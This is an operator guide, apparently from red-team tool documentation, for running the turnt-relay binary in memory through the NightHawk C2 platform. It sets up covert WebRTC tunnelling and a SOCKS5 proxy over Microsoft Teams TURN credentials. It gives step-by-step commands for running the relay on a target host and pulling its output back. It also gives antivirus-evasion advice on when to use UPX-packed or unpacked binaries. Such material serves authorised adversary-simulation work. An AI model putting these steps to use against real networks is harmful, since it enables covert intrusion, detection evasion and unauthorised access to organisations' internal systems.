# 📘 Using TURNt with NightHawk In-Memory Execution Capability

## 🧭 Overview

This guide walks through the process of using the `turnt-relay` utility in combination with the NightHawk C2 platform to establish covert communications via WebRTC. While the integration is effective, there are important considerations around execution visibility, binary size, and relay configuration that you should be aware of.

1. **NightHawk does not stream real-time output from in-memory binaries**. This means when running tools like `turnt-relay`, the operator won’t see any feedback until the binary exits. To address this, the relay utility supports writing logs and WebRTC payloads to disk so the operator can later inspect them.
2. **In-memory execution performance depends heavily on binary size.** The larger the binary, the more overhead there is during in-memory staging, especially over slower C2 channels. While you *can* use the non-UPX-packed `turnt-relay` in memory, it often results in delayed execution and a poor operator experience. Using the **UPX-packed version** significantly reduces the binary’s size and improves responsiveness when executing in-memory.
3. **When writing the binary to disk**, the UPX version becomes a liability. Packed executables are more frequently flagged by antivirus tools, so it's better to use the uncompressed version in these cases.

> ⚠️ Summary of Execution Modes:
> - ✅ **In-memory**: Use UPX-packed binary for faster staging and execution.
> - 🟡 **In-memory (non-UPX)**: Works, but expect potential delay depending on C2 channel speed.
> - 🚫 **On-disk**: Avoid UPX — high AV detection risk.

## 🛠️ Step-by-Step Instructions

### Step 1: Retrieve TURN Credentials

```bash
$ turnt-credentials msteams
Successfully retrieved Teams credentials and saved to config.yaml
```

### Step 2: Launch the Controller with TURN Configuration

```bash
$ turnt-control -config ./config.yaml
```

Example output:
```text
[+] Starting SOCKS5 proxy (controller)...
[i] Creating WebRTC peer connection...
[i] Creating WebRTC offer...
[INFO] ICE gathering complete

===== BASE64 ENCODED OFFER PAYLOAD =====
<base64 offer payload>
========================================

[i] Waiting for answer...
```

On successful connection:
```text
[+] WebRTC connection established!
[INFO] Waiting for DNS and rportfwd channels to be ready...
[INFO] WebRTC connection state changed: connected
[INFO] WebRTC connection established successfully
[INFO] All channels ready, starting SOCKS server...
[INFO] SOCKS5 server listening on 127.0.0.1:1080
```

### Step 3: Execute the Relay in NightHawk (In-Memory Recommended)

```text
[nighthawk]> execute-exe C:\turnt-relay.exe -offer <BASE64_OFFER> -log-file log.txt -offer-file offer.txt
```

### Step 4: Download the Relay Output (Answer Payload)

After execution, download `offer.txt` from the target and supply it to the controller.

### Step 5: Understand Timeouts and File Behavior

- Timeout: 5 minutes
- Files written:
  - `log.txt`
  - `offer.txt`

### Step 6: Task Management in NightHawk

```text
[nighthawk]> list-tasks
[nighthawk]> cancel-task <TASK_ID>
```

### Step 7: View Help Options Locally

```bash
$ turnt-relay --help
```

```text
Usage of turnt-relay:
  -log-file string
    	Path to write log output (optional)
  -offer string
    	Base64 encoded offer payload
  -offer-file string
    	Path to write offer/answer data (optional)
  -verbose
    	Enable verbose logging
```

## ✅ Summary

- 🔐 Use `turnt-credentials` to get TURN config before beginning.
- 🛰️ Start the controller using `turnt-control` and capture the offer.
- 🧠 Use the UPX-packed `turnt-relay` binary for faster and more reliable in-memory execution — especially over high-latency channels.
- 🟡 The uncompressed binary also works in memory but may introduce delays.
- 🛠️ NightHawk doesn't show real-time output. Expect silence until the task completes.
- 📂 Retrieve `offer.txt` after execution and feed it back into the controller to complete the handshake.
- 📈 Use `list-tasks` and `cancel-task` to monitor and manage execution inside NightHawk.

> 💡 **Pro tip**: Keep your controller session visible at all times. It's your best source of real-time diagnostics for confirming successful WebRTC negotiation and SOCKS5 traffic flow.
